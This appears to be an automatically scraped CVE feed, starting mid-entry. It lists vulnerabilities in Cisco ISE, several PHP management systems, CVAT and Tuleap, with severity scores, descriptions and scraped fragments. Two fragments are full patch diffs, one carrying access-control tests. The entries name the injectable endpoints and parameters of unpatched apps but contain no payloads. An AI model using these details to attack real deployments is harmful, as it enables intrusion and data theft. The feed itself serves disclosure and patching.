This vulnerability is due to insufficient validation of user-supplied input. An attacker could exploit this vulnerability by submitting a crafted API request. A successful exploit could allow the attacker to obtain root privileges on an affected device.

References (2):
  1. https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-ise-unauth-rce-ZAd2GnJ6 [Vendor Advisory]
  2. https://www.zerodayinitiative.com/blog/2025/7/24/cve-2025-20281-cisco-ise-api-unauthenticated-remote-code-execution-vulnerability [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://www.zerodayinitiative.com/blog/2025/7/24/cve-2025-20281-cisco-ise-api-unauthenticated-remote-code-execution-vulnerability ---
enableStrongSwanTunnel

invokeStrongSwanShellScript

sudo

================================================================================


CVE ID: CVE-2025-6610
Published: 2025-06-25T15:15:28.297
Modified: 2025-07-02T18:29:30.530
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in itsourcecode Employee Management System up to 1.0. It has been classified as critical. This affects an unknown part of the file /admin/editempprofile.php. The manipulation of the argument FirstName leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Sp1d3rL1/CVE/issues/5 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://itsourcecode.com/ [Product]
  3. https://vuldb.com/?ctiid.313827 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.313827 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601940 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313827 ---
FirstName

================================================================================


CVE ID: CVE-2025-6609
Published: 2025-06-25T15:15:28.100
Modified: 2025-07-02T18:24:56.760
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in SourceCodester Best Salon Management System 1.0 and classified as critical. Affected by this issue is some unknown functionality of the file /panel/bwdates-reports-details.php. The manipulation of the argument fromdate/todate leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-10.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313826 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313826 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601918 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313826 ---
fromdate/todate

================================================================================


CVE ID: CVE-2025-6608
Published: 2025-06-25T15:15:27.907
Modified: 2025-07-02T18:24:47.807
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in SourceCodester Best Salon Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /panel/edit-services.php. The manipulation of the argument editid leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-9.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313825 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313825 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601917 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313825 ---
editid

================================================================================


CVE ID: CVE-2025-49135
Published: 2025-06-25T15:15:24.990
Modified: 2025-09-15T15:12:27.013
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-639: CWE-639

Description:
CVAT is an open source interactive video and image annotation tool for computer vision. Versions 2.2.0 through 2.39.0 have no validation during the import process of a project or task backup to check that the filename specified in the query parameter refers to a TUS-uploaded file belonging to the same user. As a result, if an attacker with a CVAT account and a `user` role knows the filenames of other users' uploads, they could potentially access and steal data by creating projects or tasks using those files.  This issue does not affect annotation or dataset TUS uploads, since in this case object-specific temporary directories are used. Users should upgrade to CVAT 2.40.0 or a later version to receive a patch. No known workarounds are available.

References (2):
  1. https://github.com/cvat-ai/cvat/commit/dbafd9c0287489bea00e1db626f64b107f90bfc9 [Patch]
  2. https://github.com/cvat-ai/cvat/security/advisories/GHSA-frpr-5w6q-hh4f [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/cvat-ai/cvat/commit/dbafd9c0287489bea00e1db626f64b107f90bfc9 ---
From dbafd9c0287489bea00e1db626f64b107f90bfc9 Mon Sep 17 00:00:00 2001
From: Maria Khrustaleva <maria@cvat.ai>
Date: Wed, 25 Jun 2025 12:10:30 +0200
Subject: [PATCH] Merge commit from fork

There was no validation during the import process of a project or task backup to check that the filename specified in the query parameter refers to a TUS-uploaded file belonging to the same user. As a result, if an attacker with a CVAT account and a user role knew the filenames of other users' uploads, they could potentially access and steal data by creating projects or tasks using those files.
---
 .../20250609_113046_maria_validate_uploads.md |   5 +
 cvat/apps/engine/background.py                |  13 +
 .../rest_api/test_resource_import_export.py   | 330 +++++++++++++++++-
 3 files changed, 343 insertions(+), 5 deletions(-)
 create mode 100644 changelog.d/20250609_113046_maria_validate_uploads.md

diff --git a/changelog.d/20250609_113046_maria_validate_uploads.md b/changelog.d/20250609_113046_maria_validate_uploads.md
new file mode 100644
index 000000000000..ded3e51ed077
--- /dev/null
+++ b/changelog.d/20250609_113046_maria_validate_uploads.md
@@ -0,0 +1,5 @@
+### Security
+
+- Added missing file name validation when initiating an import process
+  from a file uploaded via the TUS protocol
+  (<https://github.com/cvat-ai/cvat/security/advisories/GHSA-frpr-5w6q-hh4f>)
diff --git a/cvat/apps/engine/background.py b/cvat/apps/engine/background.py
index 8a34e6606085..50e60fbdbdd6 100644
--- a/cvat/apps/engine/background.py
+++ b/cvat/apps/engine/background.py
@@ -49,6 +49,7 @@
     TaskFileSerializer,
 )
 from cvat.apps.engine.task import create_thread as create_task
+from cvat.apps.engine.tus import TusFile, TusFileForbiddenError, TusFileNotFoundError
 from cvat.apps.engine.types import ExtendedRequest
 from cvat.apps.engine.utils import (
     build_annotations_file_name,
@@ -298,6 +299,18 @@ def validate_request(self):
         ):
             raise serializers.ValidationError("The filename was not specified")
 
+        # file was uploaded via TUS
+        if (
+            self.import_args.location_config.location == Location.LOCAL
+            and self.import_args.filename
+        ):
+            try:
+                TusFile(file_id=self.import_args.filename, upload_dir=self.tmp_dir).validate(
+                    user_id=self.user_id, with_meta=False
+                )
+            except (TusFileNotFoundError, TusFileForbiddenError, ValueError):
+                raise serializers.ValidationError("No such file were uploaded")
+
     def _handle_cloud_storage_file_upload(self):
         storage_id = self.import_args.location_config.cloud_storage_id
         db_storage = get_cloud_storage_for_import_or_export(
diff --git a/tests/python/rest_api/test_resource_import_export.py b/tests/python/rest_api/test_resource_import_export.py
index 13f0151563cc..e103ea5cf8ab 100644
--- a/tests/python/rest_api/test_resource_import_export.py
+++ b/tests/python/rest_api/test_resource_import_export.py
@@ -4,10 +4,19 @@
 # SPDX-License-Identifier: MIT
 
 from http import HTTPStatus
+from pathlib import Path
+from typing import Any, Callable, Optional, Tuple
+from uuid import uuid4
 
 import pytest
-
-from shared.utils.config import get_method, post_method
+from cvat_sdk import exceptions
+from cvat_sdk.core import Client as SdkClient
+from cvat_sdk.core.progress import NullProgressReporter
+from cvat_sdk.core.uploading import Uploader
+from pytest_cases import fixture, fixture_ref, parametrize
+
+from shared.fixtures.data import Container
+from shared.utils.config import get_method, make_sdk_client, post_method
 from shared.utils.resource_import_export import (
     _CloudStorageResourceTest,
     _make_export_resource_params,
@@ -17,9 +26,6 @@
 
 from .utils import create_task
 
-# https://docs.pytest.org/en/7.1.x/example/markers.html#marking-whole-classes-or-modules
-pytestmark = [pytest.mark.with_external_services]
-
 
 class _S3ResourceTest(_CloudStorageResourceTest):
     @staticmethod
@@ -27,6 +33,7 @@ def _make_client():
         return make_s3_client()
 
 
+@pytest.mark.with_external_services
 @pytest.mark.usefixtures("restore_db_per_class")
 class TestExportResourceToS3(_S3ResourceTest):
     @pytest.mark.usefixtures("restore_redis_inmem_per_function")
@@ -176,6 +183,7 @@ def test_user_cannot_export_to_cloud_storage_with_specific_location_without_acce
         )
 
 
+@pytest.mark.with_external_services
 @pytest.mark.usefixtures("restore_db_per_function")
 @pytest.mark.usefixtures("restore_cvat_data_per_function")
 class TestImportResourceFromS3(_S3ResourceTest):
@@ -350,3 +358,315 @@ def test_user_cannot_import_from_cloud_storage_with_specific_location_without_ac
             _expect_status=HTTPStatus.FORBIDDEN,
             **kwargs,
         )
+
+
+@pytest.mark.usefixtures("restore_db_per_function")
+@pytest.mark.usefixtures("restore_redis_inmem_per_function")
+@pytest.mark.usefixtures("restore_redis_ondisk_per_function")
+class TestUploads:
+    @fixture()
+    def project(self, projects: Container):
+        return next(p for p in projects)
+
+    @fixture()
+    def task(self, tasks: Container):
+        return next(t for t in tasks)
+
+    @fixture()
+    def job(self, jobs: Container):
+        return next(j for j in jobs if j["type"] == "annotation")
+
+    @fixture(scope="class")
+    def restore_task_api_path(self, admin_user: str):
+        with make_sdk_client(admin_user) as client:
+            return client.api_client.tasks_api.create_backup_endpoint.path
+
+    @fixture(scope="class")
+    def restore_project_api_path(self, admin_user: str):
+        with make_sdk_client(admin_user) as client:
+            return client.api_client.projects_api.create_backup_endpoint.path
+
+    @fixture(scope="class")
+    def upload_task_annotations_api_path(self, admin_user: str):
+        with make_sdk_client(admin_user) as client:
+            return client.api_client.tasks_api.create_annotations_endpoint.path
+
+    @fixture(scope="class")
+    def upload_project_dataset_api_path(self, admin_user: str):
+        with make_sdk_client(admin_user) as client:
+            return client.api_client.projects_api.create_dataset_endpoint.path
+
+    @fixture(scope="class")
+    def upload_job_annotations_api_path(self, admin_user: str):
+        with make_sdk_client(admin_user) as client:
+            return client.api_client.jobs_api.create_annotations_endpoint.path
+
+    def _find_malefactor_with_its_resource(
+        self,
+        resources: Container,
+        users: Container,
+        *,
+        get_owner_func: Callable = lambda r: r["owner"],
+        user_to_skip: Optional[int] = None,
+    ) -> Tuple[dict, int]:
+        for resource in resources:
+            malefactor = get_owner_func(resource)
+            if not users[malefactor["id"]]["is_superuser"] and malefactor["id"] != user_to_skip:
+                return malefactor, resource["id"]
+
+        assert False
+
+    @fixture()
+    def downloaded_file_path(self, tmp_path: Path):
+        return tmp_path / f"{uuid4()}.zip"
+
+    @fixture()
+    def project_backup_with_owner_and_malefactor(
+        self,
+        project: dict,
+        projects: Container,
+        downloaded_file_path: Path,
+        restore_project_api_path: str,
+        users: Container,
+    ):
+        project_id, project_owner = project["id"], project["owner"]
+        malefactor, _ = self._find_malefactor_with_its_resource(
+            projects, users, user_to_skip=project_owner["id"]
+        )
+
+        with make_sdk_client(project_owner["username"]) as client:
+            client.projects.retrieve(project_id).download_backup(downloaded_file_path)
+
+            return (
+                None,
+                downloaded_file_path,
+                project_owner,
+                malefactor,
+                None,
+                restore_project_api_path,
+                None,
+            )
+
+    @fixture()
+    def project_dataset_with_owner_and_malefactor(
+        self,
+        project: dict,
+        projects: Container,
+        downloaded_file_path: Path,
+        upload_project_dataset_api_path: str,
+        users: Container,
+    ):
+        project_id, project_owner = project["id"], project["owner"]
+
+        malefactor, malefactor_project_id = self._find_malefactor_with_its_resource(
+            projects, users, user_to_skip=project_owner["id"]
+        )
+
+        with make_sdk_client(project_owner["username"]) as client:
+            client.projects.retrieve(project_id).export_dataset(
+                "COCO 1.0", downloaded_file_path, include_images=True
+            )
+
+            return (
+                project_id,
+                downloaded_file_path,
+                project_owner,
+                malefactor,
+                malefactor_project_id,
+                upload_project_dataset_api_path,
+                {"format": "COCO 1.0"},
+            )
+
+    @fixture()
+    def task_backup_with_owner_and_malefactor(
+        self,
+        task: dict,
+        tasks: Container,
+        downloaded_file_path: Path,
+        restore_task_api_path: str,
+        users: Container,
+    ):
+        task_id = task["id"]
+        task_owner = task["owner"]
+
+        malefactor, _ = self._find_malefactor_with_its_resource(
+            tasks, users, user_to_skip=task_owner["id"]
+        )
+
+        with make_sdk_client(task_owner["username"]) as client:
+            client.tasks.retrieve(task_id).download_backup(downloaded_file_path)
+
+            return (
+                None,
+                downloaded_file_path,
+                task_owner,
+                malefactor,
+                None,
+                restore_task_api_path,
+                None,
+            )
+
+    @fixture()
+    def task_annotations_with_owner_and_malefactor(
+        self,
+        task: dict,
+        tasks: Container,
+        downloaded_file_path: Path,
+        upload_task_annotations_api_path: str,
+        users: Container,
+    ):
+        task_id = task["id"]
+        task_owner = task["owner"]
+
+        malefactor, malefactor_task_id = self._find_malefactor_with_its_resource(
+            tasks, users, user_to_skip=task_owner["id"]
+        )
+
+        with make_sdk_client(task_owner["username"]) as client:
+            client.tasks.retrieve(task_id).export_dataset(
+                "COCO 1.0", downloaded_file_path, include_images=False
+            )
+
+            return (
+                task_id,
+                downloaded_file_path,
+                task_owner,
+                malefactor,
+                malefactor_task_id,
+                upload_task_annotations_api_path,
+                {"format": "COCO 1.0"},
+            )
+
+    @fixture()
+    def job_annotations_with_owner_and_malefactor(
+        self,
+        job: dict,
+        jobs: Container,
+        tasks: Container,
+        downloaded_file_path: Path,
+        upload_job_annotations_api_path: str,
+        users: Container,
+    ):
+        job_id = job["id"]
+        job_owner = tasks[job["task_id"]]["owner"]
+
+        malefactor, malefactor_job_id = self._find_malefactor_with_its_resource(
+            jobs,
+            users,
+            user_to_skip=job_owner["id"],
+            get_owner_func=lambda x: tasks[x["task_id"]]["owner"],
+        )
+
+        with make_sdk_client(job_owner["username"]) as client:
+            client.jobs.retrieve(job_id).export_dataset(
+                "COCO 1.0", downloaded_file_path, include_images=False
+            )
+
+            return (
+                job_id,
+                downloaded_file_path,
+                job_owner,
+                malefactor,
+                malefactor_job_id,
+                upload_job_annotations_api_path,
+                {"format": "COCO 1.0"},
+            )
+
+    def _test_can_finish_upload(
+        self,
+        client: SdkClient,
+        url: str,
+        *,
+        query_params: dict[str, Any],
+    ):
+        Uploader(client)._tus_finish_upload(url, query_params=query_params)
+
+    def _test_cannot_finish_upload(
+        self,
+        client: SdkClient,
+        url: str,
+        *,
+        query_params: dict[str, Any],
+    ):
+        uploader = Uploader(client)
+
+        with pytest.raises(exceptions.ApiException) as capture:
+            uploader._tus_finish_upload(url, query_params=query_params)
+
+        assert capture.value.status == HTTPStatus.BAD_REQUEST
+        assert b"No such file were uploaded" in capture.value.body
+
+    @parametrize(
+        "resource, endpoint_path",
+        [
+            (None, fixture_ref(restore_task_api_path)),
+            (None, fixture_ref(restore_project_api_path)),
+            (fixture_ref(task), fixture_ref(upload_task_annotations_api_path)),
+            (fixture_ref(project), fixture_ref(upload_project_dataset_api_path)),
+            (fixture_ref(job), fixture_ref(upload_job_annotations_api_path)),
+        ],
+    )
+    def test_user_cannot_restore_resource_from_non_existent_uploads(
+        self, resource: dict, endpoint_path: str, admin_user: str
+    ):
+        with make_sdk_client(admin_user) as client:
+            url = client.api_map.make_endpoint_url(
+                endpoint_path, kwsub=({"id": resource["id"]} if resource else None)
+            )
+            self._test_cannot_finish_upload(
+                client, url, query_params={"filename": "non-existent-file.zip"}
+            )
+
+    @parametrize(
+        "src_resource_id, archive_path, owner, malefactor, dst_resource_id, endpoint_path, query_params",
+        [
+            (fixture_ref(task_backup_with_owner_and_malefactor)),
+            (fixture_ref(project_backup_with_owner_and_malefactor)),
+            (fixture_ref(job_annotations_with_owner_and_malefactor)),
+            (fixture_ref(task_annotations_with_owner_and_malefactor)),
+            (fixture_ref(project_dataset_with_owner_and_malefactor)),
+        ],
+    )
+    def test_user_can_use_only_own_uploads(
+        self,
+        src_resource_id: Optional[int],
+        archive_path: Path,
+        owner: dict,
+        malefactor: dict,
+        dst_resource_id: Optional[str],
+        endpoint_path: str,
+        query_params: Optional[dict],
+    ):
+        with (
+            make_sdk_client(owner["username"]) as owner_client,
+            make_sdk_client(malefactor["username"]) as malefactor_client,
+        ):
+            params = {"filename": archive_path.name}
+            pbar = NullProgressReporter()
+            url = owner_client.api_map.make_endpoint_url(
+                endpoint_path, kwsub=({"id": src_resource_id} if src_resource_id else None)
+            )
+
+            uploader = Uploader(owner_client)
+            uploader._tus_start_upload(url, query_params=params)
+            with uploader._uploading_task(pbar, archive_path.stat().st_size):
+                upload_name = uploader._upload_file_data_with_tus(
+                    url,
+                    archive_path,
+                    meta=params,
+                    logger=owner_client.logger.debug,
+                    pbar=pbar,
+                )
+
+            query_params = {"filename": upload_name, **(query_params or {})}
+
+            # check that malefactor cannot use someone else's uploaded file
+            url_to_steal = malefactor_client.api_map.make_endpoint_url(
+                endpoint_path, kwsub=({"id": dst_resource_id} if dst_resource_id else None)
+            )
+            self._test_cannot_finish_upload(
+                malefactor_client, url=url_to_steal, query_params=query_params
+            )
+
+            # check that uploaded file still exists and owner can finish started process
+            self._test_can_finish_upload(owner_client, url=url, query_params=query_params)


================================================================================


CVE ID: CVE-2024-27685
Published: 2025-06-25T15:15:21.960
Modified: 2025-07-02T16:16:17.260
CVSS Score: 7.1 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N

CWE Categories:
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
SQL Injection vulnerability in Student Record system Using PHP and MySQL v.3.20 allows a remote attacker to obtain sensitive information via a crafted payload to the $cshortname, $cfullname, and $cdate variables.

References (2):
  1. https://medium.com/@cnetsec/a-sql-injection-vulnerability-exists-in-the-student-record-system-using-php-and-mysql-v3-20-df2c6fe7dc15 [Third Party Advisory]
  2. https://phpgurukul.com/student-record-system-php/ [Product]

Attempting to extract code examples from references...

--- Code from https://phpgurukul.com/student-record-system-php/ ---
studentrecordms

studentrecorddb

studentrecorddb.sql

================================================================================


CVE ID: CVE-2025-6607
Published: 2025-06-25T14:15:26.577
Modified: 2025-07-02T16:20:14.400
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in SourceCodester Best Salon Management System 1.0. Affected is an unknown function of the file /panel/stock.php. The manipulation of the argument ID leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-8.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313824 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313824 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601916 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-8.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313824 ---
ID

================================================================================


CVE ID: CVE-2025-6606
Published: 2025-06-25T14:15:26.387
Modified: 2025-07-02T16:23:44.753
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in SourceCodester Best Salon Management System 1.0. This issue affects some unknown processing of the file /panel/add-services.php. The manipulation of the argument Type leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-7.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313823 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313823 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601915 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-7.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313823 ---
type

================================================================================


CVE ID: CVE-2025-6605
Published: 2025-06-25T14:15:26.133
Modified: 2025-07-02T16:34:13.343
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in SourceCodester Best Salon Management System 1.0. This vulnerability affects unknown code of the file /panel/edit-staff.php. The manipulation of the argument editid leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-6.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.313822 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.313822 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601914 [Third Party Advisory, VDB Entry]
  5. https://www.sourcecodester.com/ [Product]
  6. https://github.com/Colorado-all/cve/blob/main/Best%20salon%20management%20system/SQL-6.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.313822 ---
editid

================================================================================


CVE ID: CVE-2025-48991
Published: 2025-06-25T14:15:24.943
Modified: 2025-08-21T20:49:34.360
CVSS Score: 4.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-352: Cross-Site Request Forgery (CSRF)

Description:
Tuleap is an Open Source Suite to improve management of software developments and collaboration. An attacker could use a vulnerability present in Tuleap Community Edition prior to version 16.8.99.1748845907 and Tuleap Enterprise Edition prior to versions 16.8-3 and 16.7-5 to trick victims into changing the canned responses. Tuleap Community Edition 16.8.99.1748845907, Tuleap Enterprise Edition 16.8-3, and Tuleap Enterprise Edition 16.7-5 contain a fix for the vulnerability.

References (4):
  1. https://github.com/Enalean/tuleap/commit/cbf9b2a38e33dfd755dc2ccf074126b598a78274 [Patch]
  2. https://github.com/Enalean/tuleap/security/advisories/GHSA-px9r-875r-w534 [Third Party Advisory]
  3. https://tuleap.net/plugins/git/tuleap/tuleap/stable?a=commit&h=cbf9b2a38e33dfd755dc2ccf074126b598a78274 [Broken Link]
  4. https://tuleap.net/plugins/tracker/?aid=43326 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/Enalean/tuleap/commit/cbf9b2a38e33dfd755dc2ccf074126b598a78274 ---
From cbf9b2a38e33dfd755dc2ccf074126b598a78274 Mon Sep 17 00:00:00 2001
From: Thomas Gerbet <thomas.gerbet@enalean.com>
Date: Fri, 30 May 2025 11:44:04 +0200
Subject: [PATCH] fix: request #43326 Missing CSRF protection on tracker canned
 responses administration

Change-Id: I2fb1c989c0ade2da510a80257f2be3157a688801
---
 .../Tracker_CannedResponseManager.php         | 71 ++++++++++++-------
 .../tracker-admin/src/canned-responses.ts     | 37 ++++++++++
 .../scripts/tracker-admin/webpack.common.js   |  1 +
 .../fr_FR/LC_MESSAGES/tuleap-tracker.po       |  5 +-
 .../pt_BR/LC_MESSAGES/tuleap-tracker.po       |  5 +-
 5 files changed, 92 insertions(+), 27 deletions(-)
 create mode 100644 plugins/tracker/scripts/tracker-admin/src/canned-responses.ts

diff --git a/plugins/tracker/include/Tracker/CannedResponse/Tracker_CannedResponseManager.php b/plugins/tracker/include/Tracker/CannedResponse/Tracker_CannedResponseManager.php
index 785b069461d..d48f99331e8 100644
--- a/plugins/tracker/include/Tracker/CannedResponse/Tracker_CannedResponseManager.php
+++ b/plugins/tracker/include/Tracker/CannedResponse/Tracker_CannedResponseManager.php
@@ -19,6 +19,8 @@
  * along with Tuleap. If not, see <http://www.gnu.org/licenses/>.
  */
 
+use Tuleap\Layout\IncludeAssets;
+
 class Tracker_CannedResponseManager
 {
     /**
@@ -31,41 +33,43 @@ public function __construct(Tracker $tracker)
         $this->tracker = $tracker;
     }
 
-    public function process(TrackerManager $tracker_manager, $request, $current_user)
+    public function process(TrackerManager $tracker_manager, HTTPRequest $request, PFUser $current_user): void
     {
+        if (! $request->isPost()) {
+            if ($request->get('edit') !== false) {
+                $this->displayAdminResponse($tracker_manager, $request);
+            }
+            $GLOBALS['HTML']->addJavascriptAsset(new \Tuleap\Layout\JavascriptAsset(
+                new IncludeAssets(__DIR__ . '/../../../scripts/tracker-admin/frontend-assets', '/assets/trackers/tracker-admin'),
+                'canned-responses.js'
+            ));
+            $this->displayAdminAllResponses($tracker_manager);
+            return;
+        }
+        $this->getCSRFTokenAdmin()->check();
         if ($request->get('create')) {
             if ($request->existAndNonEmpty('title') && $request->existAndNonEmpty('body')) {
                 if (Tracker_CannedResponseFactory::instance()->create($this->tracker, $request->get('title'), $request->get('body'))) {
                     $GLOBALS['Response']->addFeedback('info', 'Created');
-                    $GLOBALS['Response']->redirect(TRACKER_BASE_URL . '/?' . http_build_query([
-                        'tracker' => (int) $this->tracker->id,
-                        'func'    => 'admin-canned',
-                    ]));
+                    $GLOBALS['Response']->redirect($this->getURLAdmin());
                 }
             }
         } elseif ($canned_id = (int) $request->get('delete')) {
             if (Tracker_CannedResponseFactory::instance()->delete($canned_id)) {
                 $GLOBALS['Response']->addFeedback('info', 'Deleted');
-                $GLOBALS['Response']->redirect(TRACKER_BASE_URL . '/?' . http_build_query([
-                    'tracker' => (int) $this->tracker->id,
-                    'func'    => 'admin-canned',
-                ]));
+                $GLOBALS['Response']->redirect($this->getURLAdmin());
             }
         } elseif ($canned_id = (int) $request->get('update')) {
             if (Tracker_CannedResponseFactory::instance()->update($canned_id, $this->tracker, trim($request->get('title')), $request->get('body'))) {
                 $GLOBALS['Response']->addFeedback('info', 'Updated');
-                $GLOBALS['Response']->redirect(TRACKER_BASE_URL . '/?' . http_build_query([
-                    'tracker' => (int) $this->tracker->id,
-                    'func'    => 'admin-canned',
-                ]));
+                $GLOBALS['Response']->redirect($this->getURLAdmin());
             }
-        } elseif ($canned_id = (int) $request->get('edit')) {
-            $this->displayAdminResponse($tracker_manager, $request, $current_user);
         }
-        $this->displayAdminAllResponses($tracker_manager, $request, $current_user);
+
+        $GLOBALS['Response']->redirect($this->getURLAdmin());
     }
 
-    protected function displayAdminAllResponses(TrackerManager $tracker_manager, $request, $current_user)
+    protected function displayAdminAllResponses(TrackerManager $tracker_manager): void
     {
         $hp    = Codendi_HTMLPurifier::instance();
         $title = dgettext('tuleap-tracker', 'Canned responses');
@@ -98,13 +102,15 @@ protected function displayAdminAllResponses(TrackerManager $tracker_manager, $re
                 echo '</td>';
 
                 //delete
-                echo '<td><a href="' . TRACKER_BASE_URL . '/?' . http_build_query([
-                    'tracker' => (int) $this->tracker->id,
-                    'func'    => 'admin-canned',
-                    'delete'  => (int) $response->id,
-                ]) . '" onClick="return confirm(\'' . addslashes(sprintf(dgettext('tuleap-tracker', 'Delete this Canned Response : %1$s ?'), $response->title)) . '\')">';
-                echo $GLOBALS['HTML']->getImage('ic/cross.png');
-                echo '</a></td></tr>';
+                echo '<td>';
+                $confirmation_message = sprintf(dgettext('tuleap-tracker', 'Delete this Canned Response: %1$s?'), $response->title);
+                echo '<form class="delete-canned-response" method="post" href="' . $this->getURLAdmin() . '" data-confirmation-message="' . $hp->purify($confirmation_message) . '">';
+                echo '<input type="hidden" name="delete" value="' . $hp->purify($response->id) . '"/>';
+                echo $this->getCSRFTokenAdmin()->fetchHTMLInput();
+                echo '<button class="btn-link" type="submit">';
+                echo $GLOBALS['HTML']->getImage('ic/cross.png', ['alt' => dgettext('tuleap-tracker', 'Delete the canned response')]);
+                echo '</button>';
+                echo '</form></td></tr>';
             }
             echo '</table>';
         } else {
@@ -120,6 +126,7 @@ protected function displayAdminAllResponses(TrackerManager $tracker_manager, $re
             'tracker' => (int) $this->tracker->id,
             'func'    => 'admin-canned',
         ]) . '" method="POST">';
+        echo $this->getCSRFTokenAdmin()->fetchHTMLInput();
         echo '<b>' . dgettext('tuleap-tracker', 'Title') . ':</b><br />';
         echo '<input type="text" name="title" value="" size="50">';
         echo '<p>';
@@ -132,7 +139,7 @@ protected function displayAdminAllResponses(TrackerManager $tracker_manager, $re
         $this->tracker->displayFooter($tracker_manager);
     }
 
-    protected function displayAdminResponse(TrackerManager $tracker_manager, $request, $current_user)
+    protected function displayAdminResponse(TrackerManager $tracker_manager, $request): void
     {
         if ($response = Tracker_CannedResponseFactory::instance()->getCannedResponse($this->tracker, (int) $request->get('edit'))) {
             $hp    = Codendi_HTMLPurifier::instance();
